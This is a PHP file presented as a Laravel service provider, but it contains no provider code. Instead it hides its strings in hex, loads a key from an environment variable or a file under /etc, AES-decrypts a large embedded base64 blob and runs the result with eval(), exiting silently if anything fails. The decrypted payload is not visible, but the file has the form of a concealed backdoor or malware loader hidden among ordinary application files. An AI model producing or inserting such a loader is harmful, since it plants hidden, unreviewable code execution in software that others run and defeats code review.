<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ps6eLXSO5iu3hLdSnQ8oyg==');

$c=base64_decode(

'IpXHGnvMc0xoG3z9osy1JnU61r9e3SJQyI3KvBpOIg1vjGs0ykr5vJgiHy9DdDXmZQHEaqsuCQ0r' .
'yRmxtNWNCEq0bHAgbbXWe/HZAuHkLUpgM/GtNKCrsFRQ9BWlhW8D5C3u3Eza3qPsCHp+0g4UeiJM' .
'/C1ZuV4LQ8SPV8eFUx5CL/6xT0tIf9z6GzUhAv/55eu6VLSA7J3PtgMuka8+tyZ74krIMDNLR/ci' .
'sbhgky0SnxSehUpcT9rXAb+u/sYzvzu4UL3OxoE2hxi3GJZ5eXDuP0+q6y1Hi2DBs1cCHug1jIZd' .
'TaZcmf22hi7buNjFjXm0n7kl69Cq17x/ctVWZOByri/Y9uv6Amq6IgovpuVKSZKqCPVBdmGAIcZ5' .
'piPqXVovXKq7jNVee5rsUdilKGzs0zZyh/6p/vMvBMB1YMnVRFcg/vXpgEqW9FqVz0/CWd0Mj7xl' .
'StQn0y0i1cl40sau+8nFwRqzMOkXsZaK+Z1QzzJmtzcOeFbdJRipjPpCLFcyJYfMriLFas6IEEvU' .
'aMoOqtEnSDqyrnUlsfKE0Nr4EDyOmTxDnxQX0oYSw1JFqwP7Il0m3/8pkya7eJ21FW+Pz74jWX6f' .
'N7mC2YDDjH0hR1KzWrXk9xBKH9Gsh5SzF3shy0P+zRiFFCag7uctvgdj3BHM15KW4PKrBfNk+ULi' .
'h12mPWdnvcNKF2YaR+jrTigDgyjM3zCVNnfpZqrRs3hLDiRU//DbZ5t1XUiFMwzqBtxotr/8xDhM' .
'Qjjma+RInOjRuQ0bY4QDbbVbva/3LIA8/18eRQ2Z5Pj2pFHEgkfeyc/NkEobC7gYAgJ+b6npe0VA' .
'CnUMw6zrfiOigKfMRRe6mp+kIjwQTj05Umj/AlzzcP+Rvj7xDinSdnin5UiUOtT4+ldObPHm0DeC' .
'N4QneyKKKEoj897mNB4BdQL8Zkc5+9fg8rEkyWMaE66D8Yzf2H0NJL+gKhCv8uDQY62IJ7ptvWDZ' .
'11QHfT34lO6uu8k8zAykIeTq7SiG3RydCCBTJFnSY7cuC4az9nF7U9POX/hnTYQr9SnlC1KL6Mt/' .
'acWy7ORqHsMRZprdU/PRoj9vDTGQFXHXWjFbes3K47yRNQiQIcbXye09CaYU/Auia4TlmP2bvP2b' .
'FE92btzb+RbaiYVBRw2GGBUEqfsFdKXAqROduYNpS85IO0PDhbMr52D7MNijIJqMPcJt8UrqZ+dE' .
'FmGhcp+Az9thOly8GN/dC7EWxzNnrIwebsB0WkQh0zY5abkEQQhb0X3EN/bZTnQIlaa3thKBTScr' .
'IP+HGKW1vJFkpEEmgRdfN5iVvEGOblzAAhhdR59WqyM8iI475i8KufMnfFwfTroUhCyFqvPFEH3f' .
'HvYrIdV1kNfcUAYiueugWXt5lLHMBrZ7fCGsH1QqAdBDOP5VQ0IIbR3Mc3jxaKsBbNWM+U6z80rs' .
'pKI4rP0JVqXpFJWcMxzG38itM6nSsweXYmgp30jpCCyHB0qVaCQZnoXV73sXzvR3fZqiP0zUIttm' .
'vi0bnG3Jbgzg6AA6jrXZfGltiTh9KKI2oBTVxVstXmBkPAsgNVmPTjpm1/APy/IGn5R0tzVWeUp0' .
'mlPuzoxb7T6rK23L2LBeTx2NR7Uhm+HqO385Cr+0uL2GYqJ6aXudSJXMG2HJA4mdsGVfsn12Lhbc' .
'QmqNFUrPuzRin1c5qS+uxeky0MS4VY9Kj087//ZNquL3vijBuFR3hS/9/PnFKSzaoT6uufie1yd/' .
'12EcM5X+BAw3nwRVCTfR1hnIOeOHNjGtb9KXL92sS8G/TgmTTNaJBnJ6dCmX8h1GhBX5AeZunTmD' .
'IgHdZAE+O4oqdR2fPHF5Gc3ZmYqy+8yR'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

